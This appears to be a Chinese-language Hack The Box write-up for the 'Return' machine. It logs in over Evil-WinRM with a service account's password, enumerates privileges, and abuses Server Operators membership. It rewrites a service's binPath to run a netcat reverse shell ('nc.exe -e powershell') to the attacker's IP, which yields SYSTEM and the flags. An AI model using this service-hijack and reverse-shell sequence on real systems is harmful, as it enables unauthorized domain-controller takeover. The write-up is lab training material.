+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.108</span> -u svc-printer -p <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span>    <br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; ls<br>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; ls C:/Users<br><br><br>    Directory: C:\Users<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">9</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">4</span>:<span class="hljs-number">40</span> AM                Administrator<br>d-r---        <span class="hljs-number">5</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">1</span>:<span class="hljs-number">50</span> AM                Public<br>d-----        <span class="hljs-number">5</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">1</span>:<span class="hljs-number">51</span> AM                svc-printer<br><br><br>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; cd ../Desktop<br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; ls<br><br><br>    Directory: C:\Users\svc-printer\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----         <span class="hljs-number">5</span>/<span class="hljs-number">7</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">2</span>:<span class="hljs-number">14</span> AM          <span class="hljs-number">59392</span> nc.exe<br>-ar---         <span class="hljs-number">5</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">7</span>:<span class="hljs-number">16</span> AM             <span class="hljs-number">34</span> user.txt<br><br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; cat user.txt<br>ff13eb37dc232a953a2d3615cb4918f6<br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>10、下面开始枚举，查看是否有可以发现的信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; whoami /priv<br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                         State<br>============================= =================================== =======<br>SeMachineAccountPrivilege     Add workstations to domain          Enabled<br>SeLoadDriverPrivilege         Load and unload device drivers      Enabled<br>SeSystemtimePrivilege         Change the system time              Enabled<br>SeBackupPrivilege             Back up files and directories       Enabled<br>SeRestorePrivilege            Restore files and directories       Enabled<br>SeShutdownPrivilege           Shut down the system                Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking            Enabled<br>SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span>      Enabled<br>SeTimeZonePrivilege           Change the time zone                Enabled<br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; net group<br><br>Group Accounts <span class="hljs-keyword">for</span> \\<br><br>-------------------------------------------------------------------------------<br>*Cloneable Domain Controllers<br>*DnsUpdateProxy<br>*Domain Admins<br>*Domain Computers<br>*Domain Controllers<br>*Domain Guests<br>*Domain Users<br>*Enterprise Admins<br>*Enterprise Key Admins<br>*Enterprise Read-only Domain Controllers<br>*Group Policy Creator Owners<br>*Key Admins<br>*Protected Users<br>*Read-only Domain Controllers<br>*Schema Admins<br>The command completed with one or more errors.<br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; net user svc-printer<br>User name                    svc-printer<br>Full Name                    SVCPrinter<br>Comment                      Service Account <span class="hljs-keyword">for</span> Printer<br>User<span class="hljs-number">&#x27;</span>s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last <span class="hljs-built_in">set</span>            <span class="hljs-number">5</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span> <span class="hljs-number">1</span>:<span class="hljs-number">15</span>:<span class="hljs-number">13</span> AM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">5</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2021</span> <span class="hljs-number">1</span>:<span class="hljs-number">15</span>:<span class="hljs-number">13</span> AM<br>Password required            Yes<br>User may change password     Yes<br><br>Workstations allowed         All<br>Logon script<br>User profile<br>Home directory<br>Last logon                   <span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2024</span> <span class="hljs-number">2</span>:<span class="hljs-number">46</span>:<span class="hljs-number">55</span> AM<br><br>Logon hours allowed          All<br><br>Local Group Memberships      *Print Operators      *Remote Management Use<br>                             *Server Operators<br>Global Group memberships     *Domain Users<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p>11、其实枚举到这里，我有注意到这两个特殊的组，一个是打印机操作组，一个是服务操作组，但是为了全面性，我就继续使用自动化枚举工具进行枚举了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; upload /home/kali/Desktop/tools/winPEASx64.exe .<br>                                        <br>Info: Uploading /home/kali/Desktop/tools/winPEASx64.exe to C:\Users\svc-printer\Desktop\.<br>                                        <br>Data: <span class="hljs-number">3183272</span> bytes of <span class="hljs-number">3183272</span> bytes copied<br>                                        <br>Info: Upload successful!<br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; ls<br><br><br>    Directory: C:\Users\svc-printer\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----         <span class="hljs-number">5</span>/<span class="hljs-number">7</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">2</span>:<span class="hljs-number">14</span> AM          <span class="hljs-number">59392</span> nc.exe<br>-ar---         <span class="hljs-number">5</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">7</span>:<span class="hljs-number">16</span> AM             <span class="hljs-number">34</span> user.txt<br>-a----         <span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">8</span>:<span class="hljs-number">08</span> PM        <span class="hljs-number">2387456</span> winPEASx64.exe<br><br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; ./winPEASx64.exe<br><br>    Folder: C:\windows\tasks<br>    FolderPerms: Authenticated Users [WriteData/CreateFiles]<br>   =================================================================================================<br><br><br>    Folder: C:\windows\system32\tasks<br>    FolderPerms: Authenticated Users [WriteData/CreateFiles]<br><br>Found PHP_files Files<br>File: C:\inetpub\wwwroot\settings.php<br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; cat C:\inetpub\wwwroot\settings.php<br>&lt;?php<br><span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>]==<span class="hljs-string">&quot;POST&quot;</span>)&#123;<br>  $ldap = ldap_connect($_POST[<span class="hljs-string">&quot;ip&quot;</span>]);<br>  $bind = ldap_bind($ldap, <span class="hljs-string">&quot;return\svc-printer&quot;</span>, <span class="hljs-string">&quot;1edFg43012!!&quot;</span>);<br>  <span class="hljs-keyword">if</span>($bind)&#123;<br>    <span class="hljs-comment">//</span><br>  &#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>12、这里枚举的信息，知道了为啥会监听389端口就获取到了密码的情况。</p>
+<p>13、下面，我有使用了SharpHound.exe和bloodhund去枚举关联分析，并没有什么特殊的发现</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; upload /home/kali/Desktop/tools/SharpHound/SharpHound.exe <br>                                        <br>Info: Uploading /home/kali/Desktop/tools/SharpHound/SharpHound.exe to C:\Users\svc-printer\Desktop\SharpHound.exe<br>                                        <br>Data: <span class="hljs-number">1395368</span> bytes of <span class="hljs-number">1395368</span> bytes copied<br>                                        <br>Info: Upload successful!<br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt;<br><br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; ls<br><br><br>    Directory: C:\Users\svc-printer\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----         <span class="hljs-number">5</span>/<span class="hljs-number">7</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">2</span>:<span class="hljs-number">14</span> AM          <span class="hljs-number">59392</span> nc.exe<br>-a----         <span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">8</span>:<span class="hljs-number">43</span> PM        <span class="hljs-number">1046528</span> SharpHound.exe<br>-ar---         <span class="hljs-number">5</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">7</span>:<span class="hljs-number">16</span> AM             <span class="hljs-number">34</span> user.txt<br>-a----         <span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">8</span>:<span class="hljs-number">08</span> PM        <span class="hljs-number">2387456</span> winPEASx64.exe<br><br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; <br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; .\SharpHound.exe --CollectionMethods All --Domain <span class="hljs-keyword">return</span>.local<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-08</span>T20:<span class="hljs-number">55</span>:<span class="hljs-number">59.8935815</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|This version of SharpHound is compatible with the <span class="hljs-number">4.3</span><span class="hljs-number">.1</span> Release of BloodHound<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-08</span>T20:<span class="hljs-number">55</span>:<span class="hljs-number">59.9873326</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-08</span>T20:<span class="hljs-number">56</span>:<span class="hljs-number">00.0029701</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Initializing SharpHound at <span class="hljs-number">8</span>:<span class="hljs-number">56</span> PM on <span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2024</span><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-08</span>T20:<span class="hljs-number">56</span>:<span class="hljs-number">02.6592161</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller <span class="hljs-keyword">for</span> <span class="hljs-keyword">return</span>.local : printer.<span class="hljs-keyword">return</span>.local<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-08</span>T20:<span class="hljs-number">56</span>:<span class="hljs-number">02.9873405</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-08</span>T20:<span class="hljs-number">56</span>:<span class="hljs-number">03.0810808</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Beginning LDAP search <span class="hljs-keyword">for</span> <span class="hljs-keyword">return</span>.local<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-08</span>T20:<span class="hljs-number">56</span>:<span class="hljs-number">03.0967151</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Producer has finished, closing LDAP channel<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-08</span>T20:<span class="hljs-number">56</span>:<span class="hljs-number">03.0967151</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|LDAP channel closed, waiting <span class="hljs-keyword">for</span> consumers<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-08</span>T20:<span class="hljs-number">56</span>:<span class="hljs-number">33.6279605</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Status: <span class="hljs-number">0</span> objects <span class="hljs-title function_">finished</span> <span class="hljs-params">(+<span class="hljs-number">0</span> <span class="hljs-number">0</span>)</span>/s -- Using 35 MB RAM<br>2024-05-08T20:56:49.3154554-07:00|INFORMATION|Consumers finished, closing output channel<br>2024-05-08T20:56:49.3310798-07:00|INFORMATION|Output channel closed, waiting <span class="hljs-keyword">for</span> output task to complete<br>Closing writers<br>2024-05-08T20:56:49.5029570-07:00|INFORMATION|Status: 90 objects <span class="hljs-title function_">finished</span> <span class="hljs-params">(+<span class="hljs-number">90</span> <span class="hljs-number">1.956522</span>)</span>/s -- Using 42 MB RAM<br>2024-05-08T20:56:49.5029570-07:00|INFORMATION|Enumeration finished in 00:00:46.4239791<br>2024-05-08T20:56:49.5498315-07:00|INFORMATION|Saving cache with stats: 50 ID to type mappings.<br> 50 name to SID mappings.<br> 0 machine sid mappings.<br> 2 sid to domain mappings.<br> 0 global catalog mappings.<br>2024-05-08T20:56:49.5498315-07:00|INFORMATION|SharpHound Enumeration Completed at 8:56 PM on 5/8/2024! Happy Graphing!<br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; ls<br><br>    Directory: C:\Users\svc-printer\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----         5/8/2024   8:56 PM          11221 20240508205649_BloodHound.zip<br>-a----         5/8/2024   8:56 PM           7540 M2Y3NjJjNWItMDZjMC00MTJkLWE1MDctODZhMmZhYmExM2Vh.bin<br>-a----         5/7/2024   2:14 AM          59392 nc.exe<br>-a----         5/8/2024   8:43 PM        1046528 SharpHound.exe<br>-ar---         5/6/2024   7:16 AM             34 user.txt<br>-a----         5/8/2024   8:08 PM        2387456 winPEASx64.exe<br><br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; <br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; download 20240508205649_BloodHound.zip<br>                                        <br>Info: Downloading C:\Users\svc-printer\Desktop\20240508205649_BloodHound.zip to 20240508205649_BloodHound.zip<br>                                        <br>Info: Download successful!<br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p>14、然后就继续回到一开始发现的2个用户组上面了，开始研究</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; net localgroup <span class="hljs-string">&quot;Print Operators&quot;</span><br>Alias name     Print Operators<br>Comment        Members can administer printers installed on domain controllers<br><br>Members<br><br>-------------------------------------------------------------------------------<br>svc-printer<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; net localgroup <span class="hljs-string">&quot;Server Operators&quot;</span><br>Alias name     Server Operators<br>Comment        Members can administer domain servers<br><br>Members<br><br>-------------------------------------------------------------------------------<br>svc-printer<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; <br></code></pre></td></tr></table></figure>
+
+<p>15、这里发现我们在 Server Operators 组的权限非常大的，下面开始研究如何利用吧</p>
+<p><code>https://book.hacktricks.xyz/v/cn/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#yu-kong-zhi-qi-fang-wen</code></p>
+<p><img src="http://sh1yan.top/photo/Return-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">域控制器访问<br>除非用户是Server Operators组的成员，否则对DC上的文件的访问是受限的，这会改变访问级别。<br><br>特权升级<br>使用Sysinternals的PsService或sc，可以检查和修改服务权限。例如，Server Operators组对某些服务拥有完全控制权，允许执行任意命令和特权升级：<br><br>C:\&gt; .\PsService.exe security AppReadiness<br>这个命令显示Server Operators具有完全访问权限，可以操纵服务以获取提升的特权。<br></code></pre></td></tr></table></figure>
+
+<p>16、继续在互联网上寻找可以突破权限的文章</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Server Operators：他们可以在域服务器上执行维护任务。<br></code></pre></td></tr></table></figure>
+
+<p><code>https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/</code></p>
+<p>17、上面的文章中有给出利用方法的步骤，直接按步骤开始利用吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; services<br><br>Path                                                                                                                 Privileges Service          <br>----                                                                                                                 ---------- -------          <br>C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             <br>\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\&#123;<span class="hljs-number">5533</span>AFC7<span class="hljs-number">-64B</span>3<span class="hljs-number">-4F</span>6E-B453-E35320B35716&#125;\MpKslDrv.sys       True MpKslceeb2796    <br>C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\SMSvcHost.exe                                                              True NetTcpPortSharing<br>C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         <br><span class="hljs-string">&quot;C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe&quot;</span>                                                False Sense            <br>C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller <br><span class="hljs-string">&quot;C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe&quot;</span>                                                     True VGAuthService    <br>C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.27</span> <span class="hljs-number">4444</span>                                                            True VMTools          <br>C:\programdata\nc.exe -e cmd <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.27</span> <span class="hljs-number">4444</span>                                                                              True VSS              <br><span class="hljs-string">&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe&quot;</span>                                             True WdNisSvc         <br><span class="hljs-string">&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe&quot;</span>                                            True WinDefend        <br><span class="hljs-string">&quot;C:\Program Files\Windows Media Player\wmpnetwk.exe&quot;</span>                                                                      False WMPNetworkSvc    <br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; <br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; sc.exe config VMTools binPath=<span class="hljs-string">&quot;C:\Users\svc-printer\Desktop\nc.exe -e powershell 10.10.14.11 443&quot;</span><br>[SC] ChangeServiceConfig SUCCESS<br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; sc.exe stop VMTools<br>[SC] ControlService FAILED <span class="hljs-number">1062</span>:<br><br>The service has not been started.<br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; sc.exe start VMTools<br>[SC] StartService FAILED <span class="hljs-number">1053</span>:<br><br>The service did not respond to the start or control request in a timely fashion.<br><br>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt;<br></code></pre></td></tr></table></figure>
+
+<p>18、获取到监听的shell，并直接去读最终的flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">443</span><br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.108</span>] <span class="hljs-number">54449</span><br>Windows PowerShell <br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> Microsoft Corporation. All rights reserved.<br><br>PS C:\Windows\system32&gt; whoami<br>whoami<br>nt authority\system<br>PS C:\Windows\system32&gt; cd C:/Users<br>cd C:/Users<br>PS C:\Users&gt; ls<br>ls<br><br><br>    Directory: C:\Users<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-----        9/27/2021   4:40 AM                Administrator                                                         <br>d-r---        5/26/2021   1:50 AM                Public                                                                <br>d-----        5/26/2021   1:51 AM                svc-printer                                                           <br><br><br>PS C:\Users&gt; cd Administrator<br>cd Administrator<br>PS C:\Users\Administrator&gt; cd Desktop<br>cd Desktop<br>PS C:\Users\Administrator\Desktop&gt; ls<br>ls<br><br><br>    Directory: C:\Users\Administrator\Desktop<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-ar---         5/6/2024   7:16 AM             34 root.txt                                                              <br><br><br>PS C:\Users\Administrator\Desktop&gt;<br>PS C:\Users\Administrator\Desktop&gt; type C:/Users/Administrator/Desktop/root.txt<br>type C:/Users/Administrator/Desktop/root.txt<br>3c61314a046c2f14c1bcce2a663a75f9<br>PS C:\Windows\system32&gt; <br></code></pre></td></tr></table></figure>
+
+<p>19、这里其实这个服务器的反弹的shell，比较不稳定，但是给的时间还是可以拿到最终的flag的</p>
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/401</code></p>
+
+                
